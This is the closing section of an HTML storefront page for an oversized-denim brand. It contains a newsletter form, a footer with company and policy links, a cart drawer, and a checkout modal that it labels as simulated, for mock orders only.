    <!-- ==========================================================================
         12. NEWSLETTER & PROMO
         ========================================================================== -->
    <section class="newsletter-section">
      <div class="container">
        <div class="newsletter-box">
          <span class="badge badge-amber" style="margin-bottom: 12px;">EXCLUSIVE DROP PRIVILEGES</span>
          <h2 style="font-family: var(--font-heading); font-size: 2.2rem; color: #fff; margin-bottom: 12px;">
            Join the Oversize Collective
          </h2>
          <p style="color: var(--text-secondary); font-size: 1rem;">
            Gain 1-hour early access to Drop 05, archive restock alerts, and an instant 10% discount on your first order.
          </p>

          <form class="newsletter-form" id="newsletterForm">
            <input type="email" placeholder="Enter your email address..." class="newsletter-input" required aria-label="Email Address">
            <button type="submit" class="btn btn-amber">Get Access</button>
          </form>
        </div>
      </div>
    </section>
  </main>

  <!-- ==========================================================================
       13. FOOTER (COMPREHENSIVE LEGAL & POLICIES ACCESS)
       ========================================================================== -->
  <footer class="site-footer">
    <div class="container">
      <div class="footer-top">
        <!-- Brand Info -->
        <div class="footer-brand-col">
          <div class="brand-logo" style="margin-bottom: 16px;">
            <span>oversizejean</span>
            <span class="tag">GLOBAL</span>
          </div>
          <p>
            The dedicated digital destination for oversized denim architecture. Crafting heavyweight 14.5oz Japanese selvedge and baggy silhouettes for modern streetwear culture.
          </p>
          <div class="footer-address-box" style="margin-top: 20px; padding: 14px 18px; background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border-subtle); border-radius: var(--radius-sm); font-size: 0.82rem; line-height: 1.6;">
            <div style="font-family: var(--font-mono); font-size: 0.72rem; color: var(--accent-amber); margin-bottom: 4px; text-transform: uppercase; font-weight: 600;">
              ● European Headquarters & Atelier (Germany)
            </div>
            <div style="color: #ffffff; font-weight: 600; font-size: 0.9rem;">oversizejean GmbH</div>
            <div style="color: var(--text-secondary);">Torstraße 108, 10119 Berlin, Germany</div>
            <div style="color: var(--text-muted); font-size: 0.75rem; margin-top: 4px;">Amtsgericht Charlottenburg (Berlin) • HRB 248910 B</div>
            <div style="color: var(--text-muted); font-size: 0.75rem;">USt-IdNr. (VAT): DE 358 912 405</div>
          </div>
          <div style="margin-top: 14px; font-family: var(--font-mono); font-size: 0.76rem; color: var(--text-muted);">
            ● BERLIN ATELIER • TOKYO STUDIO • BROOKLYN
          </div>
        </div>

        <!-- Collections -->
        <div>
          <h4 class="footer-col-title">Silhouettes</h4>
          <ul class="footer-links-list">
            <li><a href="#silhouettes">Super Wide Puddle</a></li>
            <li><a href="#silhouettes">Balloon Barrel</a></li>
            <li><a href="#silhouettes">Raw Carpenter Slub</a></li>
            <li><a href="#silhouettes">Tailored Double Pleat</a></li>
            <li><a href="#drop04">Drop 04 Collection</a></li>
          </ul>
        </div>

        <!-- Experience -->
        <div>
          <h4 class="footer-col-title">Experience</h4>
          <ul class="footer-links-list">
            <li><a href="#calculator">Baggy Fit Calculator</a></li>
            <li><a href="#lookbook">Editorial Archive</a></li>
            <li><a href="#craft">Japanese Kurabo Mills</a></li>
            <li><a href="#reviews">Community Fit Notes</a></li>
            <li><a href="#faq">Denim Care & FAQ</a></li>
          </ul>
        </div>

        <!-- Legal & Policies (Explicit User Requirement) -->
        <div>
          <h4 class="footer-col-title">Policies & Legal</h4>
          <ul class="footer-links-list">
            <li>
              <a href="disclaimer.html">
                <span>Disclaimer Notice</span>
                <span class="legal-tag">Full Doc</span>
              </a>
            </li>
            <li>
              <a href="privacy-policy.html">
                <span>Privacy Policy</span>
                <span class="legal-tag">GDPR/CCPA</span>
              </a>
            </li>
            <li>
              <a href="terms-of-service.html">
                <span>Terms of Service</span>
                <span class="legal-tag">Terms</span>
              </a>
            </li>
            <li>
              <a href="shipping-returns.html">
                <span>Shipping & Returns</span>
                <span class="legal-tag">30 Days</span>
              </a>
            </li>
            <li>
              <a href="impressum.html">
                <span>Impressum (Germany)</span>
                <span class="legal-tag">§ 5 DDG</span>
              </a>
            </li>
            <li>
              <a href="javascript:void(0)" onclick="openLegalModal('disclaimer')">
                <span style="color: var(--accent-amber);">⚡ Quick Modal Reader</span>
              </a>
            </li>
          </ul>
        </div>
      </div>

      <!-- Footer Bottom -->
      <div class="footer-bottom">
        <div>
          © 2026 oversizejean.com / oversizejean GmbH (Berlin, Germany). All Rights Reserved. Heavyweight Denim Architecture.
        </div>
        <div class="footer-legal-inline">
          <a href="disclaimer.html">Disclaimer</a>
          <a href="privacy-policy.html">Privacy</a>
          <a href="terms-of-service.html">Terms</a>
          <a href="shipping-returns.html">Shipping & Returns</a>
          <a href="impressum.html" style="color: var(--accent-amber);">Impressum (Germany)</a>
        </div>
      </div>
    </div>
  </footer>

  <!-- ==========================================================================
       14. CART DRAWER (INTERACTIVE SHOPPING BAG)
       ========================================================================== -->
  <div class="drawer-backdrop" id="drawerBackdrop" onclick="closeCartDrawer()"></div>

  <aside class="cart-drawer" id="cartDrawer" aria-label="Shopping Bag">
    <div class="cart-header">
      <h3>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
          <line x1="3" y1="6" x2="21" y2="6"></line>
          <path d="M16 10a4 4 0 0 1-8 0"></path>
        </svg>
        <span>Your Bag</span>
      </h3>
      <button class="btn-icon" onclick="closeCartDrawer()" aria-label="Close Bag">✕</button>
    </div>

    <!-- Free Shipping Progress Tracker -->
    <div class="free-shipping-tracker">
      <div class="tracker-msg" id="shippingTrackerMsg">
        <span>Add <strong>$150</strong> for Free Worldwide Express</span>
      </div>
      <div class="tracker-progress-bar">
        <div class="tracker-fill" id="shippingTrackerFill"></div>
      </div>
    </div>

    <!-- Cart Items Scrollable List -->
    <div class="cart-items-container" id="cartItemsList">
      <!-- Items dynamically populated -->
    </div>

    <!-- Empty Cart State -->
    <div class="empty-cart-state" id="cartEmptyState">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.5">
        <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
        <line x1="3" y1="6" x2="21" y2="6"></line>
        <path d="M16 10a4 4 0 0 1-8 0"></path>
      </svg>
      <h4 style="font-family: var(--font-heading); color: #fff; margin-bottom: 8px;">Your Bag is Empty</h4>
      <p style="font-size: 0.88rem; margin-bottom: 20px;">Explore Drop 04 and discover your ideal baggy silhouette.</p>
      <button class="btn btn-outline btn-sm" onclick="closeCartDrawer(); window.location.hash='#drop04';">Browse Collection</button>
    </div>

    <!-- Cart Footer & Checkout -->
    <div class="cart-footer" id="cartFooter">
      <!-- Promo Code Input -->
      <div class="coupon-row">
        <input type="text" placeholder="Promo code (e.g. OVERSIZE10)" id="couponCodeInput">
        <button class="btn btn-secondary btn-sm" id="applyCouponBtn">Apply</button>
      </div>

      <div class="cart-summary-row">
        <span>Subtotal</span>
        <span id="cartSubtotalAmount">$0.00</span>
      </div>

      <div class="cart-summary-row" id="cartDiscountRow" style="display: none; color: var(--accent-amber);">
        <span>VIP Discount</span>
        <span id="cartDiscountVal">-$0.00</span>
      </div>

      <div class="cart-summary-row">
        <span>Worldwide Shipping</span>
        <span style="color: var(--accent-emerald);">Calculated at Checkout</span>
      </div>

      <div class="cart-summary-row cart-summary-total">
        <span>Estimated Total</span>
        <span id="cartFinalTotal">$0.00</span>
      </div>

      <button class="btn btn-primary" style="width: 100%; margin-top: 18px;" onclick="startCheckout()">
        Proceed to Secure Checkout →
      </button>

      <div style="display: flex; justify-content: center; gap: 14px; margin-top: 14px; font-size: 0.72rem; color: var(--text-muted);">
        <span>🔒 256-Bit Encrypted</span>
        <span>•</span>
        <span>30-Day Free Returns</span>
      </div>
    </div>
  </aside>

  <!-- ==========================================================================
       15. QUICK VIEW MODAL
       ========================================================================== -->
  <div class="modal-backdrop" id="quickViewModal" onclick="if(event.target === this) closeModal('quickViewModal')">
    <div class="modal-window">
      <button class="modal-close-btn" onclick="closeModal('quickViewModal')" aria-label="Close modal">✕</button>
      <div id="quickViewContent">
        <!-- Injected dynamically -->
      </div>
    </div>
  </div>

  <!-- ==========================================================================
       16. CHECKOUT SIMULATOR MODAL
       ========================================================================== -->
  <div class="modal-backdrop" id="checkoutModal" onclick="if(event.target === this) closeModal('checkoutModal')">
    <div class="modal-window" style="max-width: 640px;">
      <button class="modal-close-btn" onclick="closeModal('checkoutModal')" aria-label="Close modal">✕</button>
      
      <div class="checkout-modal-content" id="checkoutFormArea">
        <div class="checkout-steps-nav">
          <div class="step-indicator active">1. Shipping</div>
          <div class="step-indicator">2. Payment</div>
          <div class="step-indicator">3. Confirmation</div>
        </div>

        <h3 style="font-family: var(--font-heading); font-size: 1.5rem; color: #fff; margin-bottom: 20px;">
          Express Shipping Details
        </h3>

        <form onsubmit="processSimulatedOrder(event)">
          <div class="form-grid-2">
            <div class="form-group-field">
              <label>First Name</label>
              <input type="text" placeholder="Alex" required>
            </div>
            <div class="form-group-field">
              <label>Last Name</label>
              <input type="text" placeholder="Vance" required>
            </div>
          </div>

          <div class="form-group-field">
            <label>Email Address (For Order Tracking)</label>
            <input type="email" placeholder="alex@example.com" required>
          </div>

          <div class="form-group-field">
            <label>Street Address</label>
            <input type="text" placeholder="Torstraße 108" required>
          </div>

          <div class="form-grid-2">
            <div class="form-group-field">
              <label>City</label>
              <input type="text" placeholder="Berlin" required>
            </div>
            <div class="form-group-field">
              <label>Postal / Zip Code</label>
              <input type="text" placeholder="10119" required>
            </div>
          </div>

          <div class="form-group-field">
            <label>Country / Region</label>
            <select class="custom-select" style="width: 100%; padding: 12px;">
              <option selected>Germany (EUR €) — Berlin Express Dispatch</option>
              <option>United States (USD $)</option>
              <option>Japan (JPY ¥)</option>
              <option>United Kingdom (GBP £)</option>
              <option>European Union (EUR €)</option>
              <option>Canada (CAD $)</option>
              <option>Australia (AUD $)</option>
            </select>
          </div>

          <div style="background: var(--bg-card); padding: 14px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle); margin-bottom: 20px; font-size: 0.85rem; color: var(--text-secondary);">
            💳 <strong>Simulation Mode Active:</strong> No real payment card will be charged. Clicking submit confirms your mock order.
          </div>

          <button type="submit" class="btn btn-primary" style="width: 100%;">
            Complete Mock Order & Generate Tracking # →
          </button>
        </form>
      </div>
    </div>
  </div>

  <!-- ==========================================================================
       17. IN-SPA LEGAL READER MODAL
       ========================================================================== -->
  <div class="modal-backdrop" id="legalModal" onclick="if(event.target === this) closeModal('legalModal')">
    <div class="modal-window" style="max-width: 720px;">
      <button class="modal-close-btn" onclick="closeModal('legalModal')" aria-label="Close modal">✕</button>
      <div class="legal-modal-inner">
        <div class="legal-modal-header">
          <span class="badge badge-amber" id="legalModalTag">Legal Notice</span>
          <h2 id="legalModalTitle" style="font-family: var(--font-heading); color: #fff; margin-top: 8px;">Legal Policy</h2>
        </div>
        <div class="legal-modal-body" id="legalModalBody">
          <!-- Dynamic Content -->
        </div>
        <div style="margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border-subtle); display: flex; justify-content: space-between; align-items: center;">
          <a href="#" id="legalModalFullLink" class="btn btn-secondary btn-sm">Open Dedicated Page →</a>
          <button class="btn btn-outline btn-sm" onclick="closeModal('legalModal')">Close Reader</button>
        </div>
      </div>
    </div>
  </div>

  <!-- JavaScript Engine -->
  <script src="assets/js/main.js"></script>
</body>
</html>
